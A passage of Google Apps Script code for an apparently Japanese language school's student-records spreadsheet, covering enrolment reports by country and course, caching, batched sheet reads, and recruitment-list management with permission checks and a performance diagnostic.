  const sortedPivotCols = Array.from(pivotColumns).sort((a, b) => {
    const partsA = a.split(' '); const partsB = b.split(' ');
    const yearA = parseInt(partsA[0]); const yearB = parseInt(partsB[0]);
    if (yearA !== yearB) return yearA - yearB;
    const monthA = parseInt(partsA[1]); const monthB = parseInt(partsB[1]);
    if (monthA !== monthB) return monthA - monthB;
    return a.localeCompare(b);
  });

  let finalReportArray = [];
  let grandTotals = { total: 0, pivotData: {} };

  for (const country in countryStats) {
    const stats = countryStats[country];
    const percentage = ((stats.total / totalStudents) * 100).toFixed(2) + "%"; 
    let rowData = [country, stats.total, percentage];
    sortedPivotCols.forEach(col => {
      const val = stats.pivotData[col] || 0;
      rowData.push(val);
      grandTotals.pivotData[col] = (grandTotals.pivotData[col] || 0) + val;
    });
    finalReportArray.push(rowData);
    grandTotals.total += stats.total;
  }

  finalReportArray.sort((a, b) => b[1] - a[1]); 

  let totalRow = ["合計", grandTotals.total, "100.00%"];
  sortedPivotCols.forEach(col => { totalRow.push(grandTotals.pivotData[col] || 0); });
  finalReportArray.push(totalRow);

  const reportHeaders = ["国名", "在籍数", "%", ...sortedPivotCols];
  finalReportArray.unshift(reportHeaders);

  let summaryReportArray = [];
  const sortedVisaTypes = Array.from(allVisaTypes).sort((a,b) => b.localeCompare(a)); 
  
  let summaryHeaders = ["コース"];
  sortedVisaTypes.forEach(v => summaryHeaders.push(v));
  summaryHeaders.push("合計");
  summaryReportArray.push(summaryHeaders);

  let grandTotalSummary = { total: 0 };
  sortedVisaTypes.forEach(v => grandTotalSummary[v] = 0);

  const sortedCourses = Object.keys(courseVisaStats).sort((a, b) => courseVisaStats[b].total - courseVisaStats[a].total);

  sortedCourses.forEach(course => {
    let row = [course];
    sortedVisaTypes.forEach(v => {
      let count = courseVisaStats[course][v] || 0;
      row.push(count);
      grandTotalSummary[v] += count;
    });
    row.push(courseVisaStats[course].total);
    grandTotalSummary.total += courseVisaStats[course].total;
    summaryReportArray.push(row);
  });

  let totalRowSummary = ["合計"];
  sortedVisaTypes.forEach(v => totalRowSummary.push(grandTotalSummary[v]));
  totalRowSummary.push(grandTotalSummary.total);
  summaryReportArray.push(totalRowSummary);

  return {
    mainTable: finalReportArray,
    summaryTable: summaryReportArray,
    totalCountries: Object.keys(countryStats).length
  }; 
}

// ============================================
// STUDENT INTAKE SIMULATION (course + intake specific)
// ============================================
// Fixed intakes in calendar order, each with the courses offered in it.
function _simIntakeStructure_() {
  return [
    { intake: "4月", courses: ["進学1年", "進学2年", "就職", "文化"] },
    { intake: "7月", courses: ["進学1年9か月", "文化"] },
    { intake: "10月", courses: ["進学1年6か月", "就職", "文化"] },
    { intake: "1月", courses: ["進学1年3か月", "文化"] }
  ];
}

// Normalize the month counter so か月 / ヶ月 / ヵ月 all match.
function _simNormCourse_(name) {
  return String(name || "").replace(/[ヶヵ]月/g, "か月").trim();
}

// Normalize kana variations in course names so spelling differences between
// Central_DB and the simulation's expected names don't split a course into two.
// Specifically folds katakana counters (カ/ヶ) to hiragana か, which is the form
// the simulation groups by — e.g. "進学1年3カ月課程" → "進学1年3か月課程".
function _normalizeCourseKana_(s) {
  return String(s == null ? "" : s)
    .replace(/[カヵヶ]/g, "か");  // katakana ka / small ka / small ke → hiragana か
}

function _getRealCleanCourse_(course) {
  // Mirrors the normalization used in getLiveReportData so the course list matches.
  if (!course) return "";
  let cleanCourse = course.substring(course.indexOf('_') + 1).trim();
  cleanCourse = cleanCourse.replace(/[（\(]一般[）\)]/g, "").replace(/\d+期/g, "").trim();
  cleanCourse = _normalizeCourseKana_(cleanCourse);
  if (cleanCourse === "日本語・文化2年課程") cleanCourse = "文化";
  else if (cleanCourse === "就職2年課程") cleanCourse = "就職";
  else if (cleanCourse.startsWith("進学") && cleanCourse.endsWith("課程")) cleanCourse = cleanCourse.replace("課程", "");
  return cleanCourse;
}


// ============================ SERVER-SIDE CACHE ============================
// Central_DB / Past_DB scans are identical for every user, so caching them in
// CacheService means the first request pays the cost and everyone else gets it
// back instantly. Short TTLs keep the data feeling live; the student sync busts
// the cache explicitly so a fresh import is never masked by a stale entry.
const CACHE_TTL_SHORT = 300;    // 5 min  — data that changes during the day
const CACHE_TTL_LONG  = 1800;   // 30 min — vocabularies / settled history
const CACHE_VERSION_KEY = 'studentDataVersion';

// Cache keys embed a version stamp, so busting is just bumping the stamp —
// no need to track and delete every individual key.
// Memoised per execution: _cached_ calls this on EVERY lookup, and a bundle makes
// two or three, so this was two or three PropertiesService round trips per load
// to read one value that cannot change mid-request — unless we change it
// ourselves, which _bustStudentCache_ accounts for below.
let _cacheVersionMemo = null;
function _cacheVersion_() {
  if (_cacheVersionMemo !== null) return _cacheVersionMemo;
  try {
    const props = PropertiesService.getScriptProperties();
    let v = props.getProperty(CACHE_VERSION_KEY);
    if (!v) { v = String(Date.now()); props.setProperty(CACHE_VERSION_KEY, v); }
    _cacheVersionMemo = v;
    return v;
  } catch (e) { return "0"; }
}

// Call after anything that changes student data (e.g. the Central_DB sync).
function _bustStudentCache_() {
  try {
    PropertiesService.getScriptProperties().setProperty(CACHE_VERSION_KEY, String(Date.now()));
    // Drop the memo too — otherwise anything cached later in THIS execution
    // would be written under the old stamp and survive the bust.
    _cacheVersionMemo = null;
  } catch (e) {}
}

// Fetch from cache or compute. Values are JSON; anything over ~100KB is simply
// not cached (CacheService rejects large entries) and recomputed each time.
function _cached_(key, ttl, producer) {
  const full = 'v' + _cacheVersion_() + '_' + key;
  let cache = null;
  try { cache = CacheService.getScriptCache(); } catch (e) {}
  if (cache) {
    try {
      const hit = cache.get(full);
      if (hit) return JSON.parse(hit);
    } catch (e) { /* corrupt entry — fall through and recompute */ }
  }
  const val = producer();
  if (cache) {
    try {
      const s = JSON.stringify(val);
      if (s.length < 100000) cache.put(full, s, ttl);
    } catch (e) { /* too big or unserialisable — serve uncached */ }
  }
  return val;
}

// ---- Batched whole-tab reads for the big student/config sheets. ----
// Same idea as _recruitBatchValues_, but these tabs sit behind separate caches
// and are wanted by different producers, so the memo below is per-sheet: the
// first producer to want Central_DB pays for it and the rest reuse it. Central_DB
// used to be read twice on a cold 募集状況 load (once for realStats, once for the
// previous-year figures).
function _bulkReadSheets_(names) {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let out = {};
  names.forEach(function(n){ out[n] = []; });

  // batchGet errors on an unknown range, so ask only for tabs that exist.
  let exists = {};
  ss.getSheets().forEach(function(s){ exists[s.getName()] = true; });
  const present = names.filter(function(n){ return exists[n]; });
  if (!present.length) return out;

  if (typeof Sheets !== 'undefined' && Sheets.Spreadsheets) {
    try {
      const res = Sheets.Spreadsheets.Values.batchGet(ss.getId(), {
        ranges: present.map(function(n){ return "'" + n + "'"; }),
        valueRenderOption: "FORMATTED_VALUE",
        dateTimeRenderOption: "FORMATTED_STRING"
      });
      const vr = (res && res.valueRanges) || [];
      if (vr.length === present.length) {
        present.forEach(function(n, i){
          const v = (vr[i] && vr[i].values) || [];
          // Width comes from the header row; consumers locate columns by header.
          out[n] = _rectangular_(v, v[0] ? v[0].length : 0);
        });
        return out;
      }
    } catch (e) { /* fall through to per-sheet reads */ }
  }

  present.forEach(function(n){
    out[n] = ss.getSheetByName(n).getDataRange().getDisplayValues();
  });
  return out;
}

// Per-execution memo. Apps Script gives every request a fresh execution context,
// so this can never leak between requests or between users. Nothing is read
// until a producer actually asks, which means a warm bundle — every cache hit —
// triggers no read at all.
let _tabMemo = {};
function _readTabs_(names) {
  const missing = names.filter(function(n){ return !_tabMemo[n]; });
  if (missing.length) {
    const got = _bulkReadSheets_(missing);
    missing.forEach(function(n){ _tabMemo[n] = got[n] || []; });
  }
  let out = {};
  names.forEach(function(n){ out[n] = _tabMemo[n]; });
  return out;
}

// Drop a tab from the per-execution memo after writing to it, so a later read
// in the same execution sees the write rather than the pre-write snapshot.
function _forgetTab_(name) { delete _tabMemo[name]; }

// Cached wrapper — the raw scan lives in _getRealStatsUncached_ below.
function _getRealStats_() {
  return _cached_('realStats', CACHE_TTL_SHORT, _getRealStatsUncached_);
}

function _getRealStatsUncached_() {
  // Returns { realByCountryCourse: {country: {normCourse: n}}, countryTotals: {country:n}, countries: [..] }
  const rawData = _readTabs_(["Central_DB"])["Central_DB"];
  let realByCountryCourse = {};
  let countryTotals = {};
  if (!rawData || rawData.length < 2) return { realByCountryCourse: {}, countryTotals: {}, countries: [] };
  const headers = rawData[0];
  const idIdx = headers.indexOf("学籍番号");
  const countryIdx = headers.indexOf("国名");
  const courseIdx = headers.indexOf("コース");
  for (let i = 1; i < rawData.length; i++) {
    const studentId = String(rawData[i][idIdx]).trim();
    const country = rawData[i][countryIdx];
    if (!studentId || !country) continue;
    countryTotals[country] = (countryTotals[country] || 0) + 1;
    const cc = _simNormCourse_(_getRealCleanCourse_(rawData[i][courseIdx]));
    if (!cc) continue;
    if (!realByCountryCourse[country]) realByCountryCourse[country] = {};
    realByCountryCourse[country][cc] = (realByCountryCourse[country][cc] || 0) + 1;
  }
  return {
    realByCountryCourse: realByCountryCourse,
    countryTotals: countryTotals,
    countries: Object.keys(countryTotals).sort((a, b) => (countryTotals[b] || 0) - (countryTotals[a] || 0))
  };
}


// ============================ 募集状況 (RECRUITMENT) ============================
// Storage design: ONE ROW PER PROSPECTIVE STUDENT in Recruitment_DB. Counts
// (現在数 / 見込) are always derived by grouping, never stored, so they can't
// drift. Capacity (定員) is per intake+course and lives in Recruitment_Capacity.
// Course/nationality values are chosen from the same vocabularies the simulation
// uses, so prospective numbers line up with the real (enrolled) grid instead of
// silently missing on a spelling variant (the か/カ class of bug).

function _getRecruitmentSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHEET_RECRUITMENT);
  if (!sh) {
    sh = ss.insertSheet(SHEET_RECRUITMENT);
    sh.appendRow(["Timestamp", "入学期", "コース", "国名", "募集担当者", "人数", "EnteredBy"]);
    sh.setFrozenRows(1);
  }
  return sh;
}

function _getRecruitCapSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHEET_RECRUIT_CAP);
  if (!sh) {
    sh = ss.insertSheet(SHEET_RECRUIT_CAP);
    sh.appendRow(["入学期", "コース", "定員", "前年実績", "国名"]);
    sh.setFrozenRows(1);
  }
  return sh;
}

// 募集状況 permissions, two editing levels on top of view:
//   view_recruitment    — see the tab
//   edit_recruitment    — numbers, countries, 留学ビザ以外, キャンセル
//   manage_recruitment  — intakes, 定員, 地域設定, 募集担当者 (+ everything above)
// Higher levels imply the lower ones, so only one box needs ticking.
// See the note on _hasPerm_: role/perms are ignored when enforcing.
function _hasRecruitPerm_(role, perms, needed) {
  // ⚠️ REVERSED DECISION, 2026-09-07. This used to say "master only — ordinary admins
  // are governed by their own 募集状況 permissions, so 入力 can be granted without 管理".
  // That was true when an admin held exactly what was ticked. 管理者権限 now OVERRIDES
  // the ticks everywhere else, and this helper simply never got the line — so a flagged
  // 教務 saw the 募集状況 tab (the client gates on hasPermission, which does grant it)
  // and every call behind it threw 権限がありません. 24 endpoints, silently.
  //
  // ⚠️ A SECOND COPY of a decision, drifting when the decision changed — the
  // _userFromRow_ and _calCellState lesson. tests/roles.test.js asserts STRUCTURALLY
  // that every _has*Perm carries this line, because no behavioural test can see a
  // third copy that does not exist yet.
  if (_isAdminLevel_(role)) return true;
  const p = _effectivePerms_(perms);
  if (_isMasterRole_(role) || String(p || "") === "ALL") return true;
  const list = String(p || "");
  const has = function(p){ return list.indexOf(p) !== -1; };
  if (has("manage_recruitment")) return true;                       // implies all
  if (needed === "edit_recruitment") return has("edit_recruitment");
  if (needed === "view_recruitment") return has("view_recruitment") || has("edit_recruitment");
  return has(needed);
}

// Chronological key for an 入学期 name. ⚠️ ONE copy: 「2026年10月生」 sorts BEFORE
// 「2026年4月生」 on a plain text compare, and this parse is what stops that. It was written
// out twice already (_recruitIntakeList_ and getRecruitmentBundle); a third would be the
// copy that eventually disagrees about which intake is newest.
function _recIntakeSortKey_(s) {
  const m = String(s || "").match(/(\d{4})\s*年\s*(\d{1,2})\s*月/);
  return m ? (parseInt(m[1], 10) * 100 + parseInt(m[2], 10)) : -1;
}

function _recKey_(course, nationality, recruiter) {
  return String(course || "").trim() + "||" + String(nationality || "").trim() + "||" + String(recruiter || "").trim();
}

function _getRecruitMetaSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHEET_RECRUIT_META);
  if (!sh) {
    sh = ss.insertSheet(SHEET_RECRUIT_META);
    // ⚠️ 入学期 (col E) is used by "country" rows ONLY. A BLANK one means "every intake" —
    // which is what every row written before this column existed is, so the per-intake
    // change needed no migration of the live sheet. See _recCountriesFor_.
    sh.appendRow(["種別", "値", "地域", "並び順", "入学期"]);   // 種別: "intake" | "country" | "recruiter" | "region"
    sh.setFrozenRows(1);
  }
  return sh;
}

// Add a user-defined 入学期 or 国名 so it appears in the grid.
function addRecruitmentMeta(role, perms, kind, value, actorName, actorId, region, intake) {
  const k = String(kind || "").trim();
  // Countries are day-to-day data entry; intakes / regions / recruiters are
  // master settings and need the higher level.
  const lvl = (k === "country") ? "edit_recruitment" : "manage_recruitment";
  if (!_hasRecruitPerm_(role, perms, lvl)) throw new Error("権限がありません");
  const v = String(value || "").trim();
  if (k !== "intake" && k !== "country" && k !== "recruiter" && k !== "region") throw new Error("種別が不正です。");
  if (v === "") throw new Error("値を入力してください。");

  const it = String(intake || "").trim();
  // ⚠️ REFUSED, never written blank. A blank 入学期 means "every intake", so a country added
  // with none selected would appear in all of them and could not be removed from any single
  // one — quietly recreating the very thing the per-intake list exists to fix.
  if (k === "country" && it === "") throw new Error("先に入学期を選んでください。");

  const sh = _getRecruitMetaSheet_();
  // ⚠️ ONE read, threaded through the materialiser — see removeRecruitmentMeta.
  let data = sh.getDataRange().getDisplayValues();
  if (k === "country" || k === "intake") data = _recMaterialiseLegacyCountries_(sh, data);
  const rg = String(region || "").trim();
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][0]).trim() !== k || String(data[i][1]).trim() !== v) continue;
    // ⚠️ A country is a duplicate only within the SAME intake. Matching on the name alone
    // is what made 国名設定 one shared list.
    if (k === "country" && String(data[i][4] || "").trim() !== it) continue;
    // Already listed — update its region if a new one was supplied.
    if (k === "country" && rg) sh.getRange(i + 1, 3).setValue(rg);
    return { saved: true, duplicate: true };
  }
  // ⚠️ _cellSafeRow_: 国名 is user-typed free text, so a value starting with = ran as a
  // FORMULA the next time anyone opened the workbook. Pre-existing hole, fixed here because
  // this is the write site being changed.
  sh.appendRow(_cellSafeRow_([k, v, rg, "", (k === "country") ? it : ""]));
  if (k === "intake") _recSeedIntakeCountries_(sh, v);
  const labels = { intake: "入学期を追加", country: "国名を追加", recruiter: "募集担当者を追加", region: "地域グループを追加" };
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" }, labels[k], v, ""); } catch (e) {}
  return { saved: true, duplicate: false };
}

// A new 入学期 starts from the newest EXISTING one's country list, so nobody re-enters
// twenty countries per intake. Pruning it afterwards now only touches that intake.
// ⚠️ Newest by _recIntakeSortKey_ — 「2026年10月生」 sorts before 「2026年4月生」 as plain text,
// so a lexicographic pick would seed from the wrong intake roughly half the time.
function _recSeedIntakeCountries_(sh, newIntake) {
  const it = String(newIntake || "").trim();
  if (it === "") return 0;
  const rows = _recruitMetaLists_(sh.getDataRange().getDisplayValues()).countries;
  let src = "";
  rows.forEach(function (r) {
    if (r.intake === "" || r.intake === it) return;
    if (src === "" || _recIntakeSortKey_(r.intake) > _recIntakeSortKey_(src)) src = r.intake;
  });
  if (src === "") return 0;
  const already = {};
  rows.forEach(function (r) { if (r.intake === it) already[r.name] = 1; });
  const add = _recCountriesFor_(rows, src)
    .filter(function (c) { return !already[c.name]; })
    .map(function (c) { return _cellSafeRow_(["country", c.name, c.region, "", it]); });
  if (add.length) sh.getRange(sh.getLastRow() + 1, 1, add.length, 5).setValues(add);
  return add.length;
}

// Remove a user-defined 入学期 / 国名 / 募集担当者 from the list. Existing count
// rows are left untouched — the grid re-adds any value that still has data, so
// removing a recruiter never silently hides numbers already entered.
// Persist the display order for a meta kind (currently 募集担当者).
// Values arrive in the order they should appear; anything not listed keeps a
// high order number so it sorts after the explicitly-arranged entries.
function saveRecruitmentMetaOrder(role, perms, kind, orderedValues, actorName, actorId) {
  if (!_hasRecruitPerm_(role, perms, "manage_recruitment")) throw new Error("権限がありません");
  const k = String(kind || "").trim();
  const list = Array.isArray(orderedValues) ? orderedValues : [];
  if (k === "" || !list.length) return { saved: false };

  const sh = _getRecruitMetaSheet_();
  const data = sh.getDataRange().getDisplayValues();
  let pos = {};
  list.forEach(function(v, i){ pos[String(v).trim()] = i + 1; });

  // data spans rows 1..last, so data[i] is sheet row i+1 and column entry i-1.
  const last = sh.getLastRow();
  if (last >= 2) {
    const col = sh.getRange(2, 4, last - 1, 1).getValues();   // display order
    for (let i = 1; i < data.length && i - 1 < col.length; i++) {
      if (String(data[i][0]).trim() !== k) continue;
      const v = String(data[i][1] || "").trim();
      if (pos[v] !== undefined) col[i - 1][0] = pos[v];
    }
    sh.getRange(2, 4, last - 1, 1).setValues(col);
  }
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" }, "表示順を変更", k, list.join(", ")); } catch (e) {}
  return { saved: true };
}

// Rename a region and re-point every country assigned to it.
function renameRecruitmentRegion(role, perms, oldName, newName, actorName, actorId) {
  if (!_hasRecruitPerm_(role, perms, "manage_recruitment")) throw new Error("権限がありません");
  const o = String(oldName || "").trim(), n = String(newName || "").trim();
  if (o === "" || n === "") throw new Error("名称を入力してください。");
  const sh = _getRecruitMetaSheet_();
  const data = sh.getDataRange().getDisplayValues();
  // Cols 2 and 3 are adjacent (value, region), so both edits ride one write.
  // A rename touching every country row used to cost one round trip per row.
  const last = sh.getLastRow();
  let changed = false;
  if (last >= 2) {
    const blk = sh.getRange(2, 2, last - 1, 2).getValues();   // cols 2..3, rows 2..last
    for (let i = 1; i < data.length && i - 1 < blk.length; i++) {
      const k = String(data[i][0]).trim();
      if (k === "region" && String(data[i][1]).trim() === o) { blk[i - 1][0] = n; changed = true; }
      if (k === "country" && String(data[i][2] || "").trim() === o) { blk[i - 1][1] = n; changed = true; }
    }
    if (changed) sh.getRange(2, 2, last - 1, 2).setValues(blk);
  }
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" }, "地域グループを変更", o + " → " + n, ""); } catch (e) {}
  return { saved: true };
}

function removeRecruitmentMeta(role, perms, kind, value, actorName, actorId, intake) {
  const k = String(kind || "").trim();
  const lvl = (k === "country") ? "edit_recruitment" : "manage_recruitment";
  if (!_hasRecruitPerm_(role, perms, lvl)) throw new Error("権限がありません");
  const v = String(value || "").trim();
  if (v === "") return { removed: false };
  const it = String(intake || "").trim();
  if (k === "country" && it === "") throw new Error("先に入学期を選んでください。");
  const sh = _getRecruitMetaSheet_();
  // ⚠️ ONE read, threaded through. A country still covered by a shared legacy row cannot be
  // removed from a single intake until that row has been expanded, so this runs first and
  // hands back whichever rows are now true.
  let data = sh.getDataRange().getDisplayValues();
  if (k === "country") data = _recMaterialiseLegacyCountries_(sh, data);
  const hits = [];
  for (let i = data.length - 1; i >= 1; i--) {
    if (String(data[i][0]).trim() !== k || String(data[i][1]).trim() !== v) continue;
    // ⚠️ THE fix: one intake's row, not every row carrying that name.
    if (k === "country" && String(data[i][4] || "").trim() !== it) continue;
    hits.push(i);
  }
  if (!hits.length) return { removed: false };
  // Removing an 入学期 / 国名 / 担当者 / 地域 can orphan grid data keyed by that name,
  // so keep a copy of the sheet before it goes.
  // ⚠️ ONCE, not once per row. _snapshotSheet_ copies the entire sheet; inside the
  // loop a duplicated value meant N full copies, and each one evicts an older
  // backup under the SNAPSHOT_KEEP rotation.
  // ⚠️ 国名: NO sheet copy — the deleted ROW goes into the audit entry instead. MEASURED
  // (profileRecruitMeta, three runs on staging, 2026-09-11): the copy was ~1.5s of a ~5s
  // delete, the largest single leg, spent protecting ONE row of settings — name, 地域,
  // 並び順, 入学期. A 国名 delete never removes entered numbers (a country holding any still
  // shows on the grid), so that row is everything a mistake loses, and 操作履歴 now carries it.
  // ⚠️ 入学期 / 担当者 / 地域 keep the full copy: those can orphan grid data keyed by the name.
  if (k !== "country") { try { _snapshotSheet_(SHEET_RECRUIT_META); } catch (e) {} }
  // ⚠️ Built BEFORE deleteRow — the row a mistaken 国名 delete is put back from.
  const gone = hits.map(function (i) { return data[i]; });
  const detail = (k === "country")
    ? gone.map(function (r) { return _rowForLog_(data[0], r); }).join("；")
    : "";
  hits.forEach(function (i) { sh.deleteRow(i + 1); });
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" }, "募集リストから削除", k + ": " + v, detail); } catch (e) {}
  return { removed: true };
}

// Editor-run diagnostic for the parked ~5s 国名 delete. ⚠️ It exists because two rounds of
// reasoning about that delay removed real waste and still left ~5s unaccounted for — rule 8,
// estimates here have been wrong repeatedly. It times every SERVER leg of the real path
// (removeRecruitmentMeta, then the getRecruitmentBundle reload) three times and reports the
// median. The browser's `[募集状況] 国名削除` console line times the same delete end to end;
// the difference between the two is Apps Script's own per-call overhead, which neither side
// can see alone.
// ⚠️ It never touches a real Recruitment_Meta row. deleteRow is timed on a scratch sheet, the
// snapshot copy is deleted at once (no existing backup is evicted), and both are removed in
// finally blocks so an interrupted run leaves nothing behind. It does append one labelled
// 性能計測 row to the audit log per sample — _logActivity_ is one of the legs being timed.
function profileRecruitMeta() {
  _requireMaintenanceUnlock_("profileRecruitMeta");
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const SAMPLES = 3;
  const times = {};
  const add = function (k, ms) { (times[k] = times[k] || []).push(ms); };
  const time = function (k, fn) { const t = Date.now(); const r = fn(); add(k, Date.now() - t); return r; };
  const pad = function (s, n) { s = String(s); while (s.length < n) s += " "; return s; };

  // Same parking as profileApp: the guards read the SESSION, and the editor has none.
  // Running this at all needs editor access to the project, which is the authorisation.
  const wasAuthUser = _authUser;
  _authUser = { role: "master", id: "MASTER", name: "システム", permissions: "ALL" };
  let lines = [], metaRows = 0, legacy = 0, bytes = 0, intake = "";
  try {
    const meta = _getRecruitMetaSheet_();
    const probe = meta.getDataRange().getDisplayValues();
    metaRows = probe.length;
    for (let i = 1; i < probe.length; i++) {
      if (String(probe[i][0]).trim() === "country" && String(probe[i][4] || "").trim() === "") legacy++;
    }
    intake = (getRecruitmentBundle("master", "ALL", "", false).data || {}).resolvedIntake || "";

    for (let s = 0; s < SAMPLES; s++) {
      // 1. What apiCall pays before ANY endpoint runs: the session and the user row.
      _forgetTab_(SESSION_SHEET); _forgetTab_("Staff_Master");
      time("session resume (Sessions + Staff_Master)", function () {
        _readTabs_([SESSION_SHEET]); _readTabs_(["Staff_Master"]);
      });
      // 2. removeRecruitmentMeta's one read.
      time("Recruitment_Meta read", function () { return meta.getDataRange().getDisplayValues(); });
      // 3. _snapshotSheet_'s work, with the copy removed at once.
      time("snapshot (first 国名 delete per 10 min)", function () {
        const backup = _getBackupSpreadsheet_();
        backup.getSheets();
        const copy = meta.copyTo(backup);
        try { backup.deleteSheet(copy); } catch (e) {}
      });
      // 4. deleteRow, on a scratch sheet shaped like the real one.
      let scratch = null;
      try {
        scratch = ss.insertSheet("__profileRecruitMeta_" + Date.now());
        const rows = Math.max(metaRows, 2);
        const fill = [];
        for (let r = 0; r < rows; r++) fill.push(["country", "国" + r, "", r, intake]);
        scratch.getRange(1, 1, rows, 5).setValues(fill);
        SpreadsheetApp.flush();
        time("deleteRow", function () { scratch.deleteRow(2); SpreadsheetApp.flush(); });
      } finally {
        if (scratch) { try { ss.deleteSheet(scratch); } catch (e) {} }
      }
      // 5. The audit append — the real function, labelled so nobody mistakes it.
      time("_logActivity_", function () {
        _logActivity_({ role: "master", name: "システム", id: "MASTER" }, "性能計測", "profileRecruitMeta", "sample " + (s + 1));
        SpreadsheetApp.flush();
      });
      // 6. The client's reload after the delete: round trip 2.
      const b = time("getRecruitmentBundle reload", function () {
        return getRecruitmentBundle("master", "ALL", intake, false);
      });
      bytes = JSON.stringify(b || {}).length;
    }
  } finally {
    _authUser = wasAuthUser;
  }

  const med = function (a) { const x = a.slice().sort(function (p, q) { return p - q; }); return x[Math.floor(x.length / 2)]; };
  lines.push("Recruitment_Meta: " + metaRows + " rows (" + legacy + " legacy blank-入学期 country rows"
             + (legacy ? " — the FIRST delete pays a one-off rewrite of these" : "") + ")");
  lines.push("intake measured: " + (intake || "(none)") + "   reload payload: " + bytes + " bytes");
  lines.push("");
  lines.push(pad("leg", 44) + pad("median", 9) + "min–max (ms, " + SAMPLES + " samples)");
  let deleteSum = 0;
  Object.keys(times).forEach(function (k) {
    const a = times[k];
    lines.push(pad(k, 44) + pad(med(a), 9) + Math.min.apply(null, a) + "–" + Math.max.apply(null, a));
    if (k !== "getRecruitmentBundle reload") deleteSum += med(a);
  });
  lines.push("");
  lines.push("server work in the delete call ≈ " + deleteSum + " ms (snapshot included; a second delete within 10 min skips it)");
  lines.push("server work in the reload       ≈ " + med(times["getRecruitmentBundle reload"]) + " ms");
  lines.push("Compare with the browser's [募集状況] 国名削除 line: whatever it shows beyond these is");
  lines.push("Apps Script's per-call overhead, paid once per round trip (the delete makes two).");
  lines.push("⚠️ ms is noisy in this project — run this three times and read the medians.");
  const out = lines.join("\n");
  Logger.log(out);
  return out;
}

// ---- One-shot read of every tab the 募集状況 view needs. ----
// Six SpreadsheetApp reads meant six separate Sheets round trips at roughly half
// a second each, which dominated an intake switch once the per-intake rescans
// were gone. The advanced Sheets service fetches all six ranges in ONE HTTP call.
// Returns null if the service is unavailable or errors, and every consumer then
// falls back to reading its own sheet exactly as before — so an unauthorised or
// misconfigured deployment degrades in speed, never in correctness.
// Ranges are explicit rather than open-ended so a stray far-right column can't
// silently balloon the payload.
const _RECRUIT_RANGES = [
  { key: 'db',     sheet: SHEET_RECRUITMENT,     a1: 'A:G', cols: 7 },
  { key: 'cap',    sheet: SHEET_RECRUIT_CAP,     a1: 'A:E', cols: 5 },
  // ⚠️ A:E, not A:D. batchGet truncates to the range, so a short range hands back
  // undefined for 入学期 on every row — every row then looks legacy and the per-intake
  // country list silently does nothing at all.
  { key: 'meta',   sheet: SHEET_RECRUIT_META,    a1: 'A:E', cols: 5 },
  { key: 'visa',   sheet: SHEET_RECRUIT_VISA,    a1: 'A:J', cols: 10 },
  { key: 'cancel', sheet: SHEET_RECRUIT_CANCEL,  a1: 'A:F', cols: 6 },
  { key: 'notissued', sheet: SHEET_RECRUIT_NOTISSUED, a1: 'A:E', cols: 5 },
  { key: 'note',   sheet: SHEET_RECRUIT_NOTE,    a1: 'A:H', cols: 8 }
];

// batchGet omits trailing empty cells, so rows arrive ragged. getDisplayValues
// hands back a rectangle and every consumer indexes fixed columns, so pad to
// match — otherwise a short row yields undefined and, e.g., String(undefined)
// would quietly become the string "undefined".
function _rectangular_(rows, cols) {
  for (let i = 0; i < rows.length; i++) {
    const r = rows[i];
    for (let j = r.length; j < cols; j++) r[j] = "";
    for (let j = 0; j < cols; j++) if (r[j] == null) r[j] = "";
  }
  return rows;
}

function _recruitBatchValues_() {
  if (typeof Sheets === 'undefined' || !Sheets.Spreadsheets) return null;

  // batchGet errors on an unknown range, while these helpers create the tab on
  // first use — so ensure existence before asking for anything by name.
  _getRecruitmentSheet_(); _getRecruitCapSheet_(); _getRecruitMetaSheet_();
  _getOtherVisaSheet_();   _getCancelSheet_();     _getNoteSheet_();
  _getNotIssuedSheet_();

  let res;
  try {
    res = Sheets.Spreadsheets.Values.batchGet(
      SpreadsheetApp.getActiveSpreadsheet().getId(),
      {
        ranges: _RECRUIT_RANGES.map(function(r){ return "'" + r.sheet + "'!" + r.a1; }),
        // Match getDisplayValues: formatted text, so 学籍番号-style leading zeros
        // and date cells read the same as they always have.
        valueRenderOption: "FORMATTED_VALUE",
        dateTimeRenderOption: "FORMATTED_STRING"
      });
  } catch (e) { return null; }

  const vr = (res && res.valueRanges) || [];
  if (vr.length !== _RECRUIT_RANGES.length) return null;

  let out = {};
  _RECRUIT_RANGES.forEach(function(r, i){
    out[r.key] = _rectangular_((vr[i] && vr[i].values) || [], r.cols);
  });
  return out;
}

function _recruitMetaLists_(pre) {
  const data = pre || _getRecruitMetaSheet_().getDataRange().getDisplayValues();
  let intakes = [], countries = [], recruiters = [], regions = [];
  for (let i = 1; i < data.length; i++) {
    const k = String(data[i][0] || "").trim();
    const v = String(data[i][1] || "").trim();
    if (!v) continue;
    if (k === "intake" && intakes.indexOf(v) === -1) intakes.push(v);
    // ⚠️ Every row is kept, keyed by (name, intake) — NOT deduped by name. Deduping by
    // name here is what made one list serve every intake in the first place.
    if (k === "country") {
      const it = String(data[i][4] || "").trim();
      if (!countries.some(function(x){ return x.name === v && x.intake === it; })) {
        countries.push({ name: v, region: String(data[i][2] || "").trim(), intake: it });
      }
    }
    if (k === "recruiter" && !recruiters.some(function(x){ return x.name === v; })) {
      const o = parseInt(String(data[i][3] || ""), 10);
      recruiters.push({ name: v, order: isNaN(o) ? 9999 : o });
    }
    if (k === "region" && regions.indexOf(v) === -1) regions.push(v);
  }
  // Seed the default groups the first time, so the grid is never region-less.
  if (regions.length === 0) {
    regions = ["アジア", "南アジア", "中国語圏", "欧米・その他"];
    try {
      const sh2 = _getRecruitMetaSheet_();
      regions.forEach(function(r){ sh2.appendRow(["region", r, ""]); });
    } catch (e) { /* seeding is best-effort */ }
  }
  // Sort recruiters by their stored order; unordered entries fall to the end
  // in the order they were added.
  recruiters.sort(function(a, b){ return a.order - b.order; });
  return { intakes: intakes, countries: countries,
           recruiters: recruiters.map(function(r){ return r.name; }),
           regions: regions };
}

